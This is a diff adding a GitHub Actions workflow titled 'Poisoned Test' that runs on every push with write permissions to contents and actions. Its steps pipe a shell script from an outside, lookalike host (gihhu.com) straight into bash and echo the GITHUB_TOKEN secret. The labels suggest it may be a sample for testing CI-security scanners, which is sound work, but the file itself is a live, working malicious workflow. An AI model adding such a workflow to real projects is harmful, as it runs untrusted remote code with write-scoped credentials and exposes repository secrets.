@@ -1,0 +1,21 @@
+name: Poisoned Test
+
+on:
+  push:
+  
+permissions:
+  contents: write
+  actions: write
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Suspicious download
+        run: curl https://gihhu.com/script.sh | bash
+
+      - name: Secret access
+        run: echo $GITHUB_TOKEN
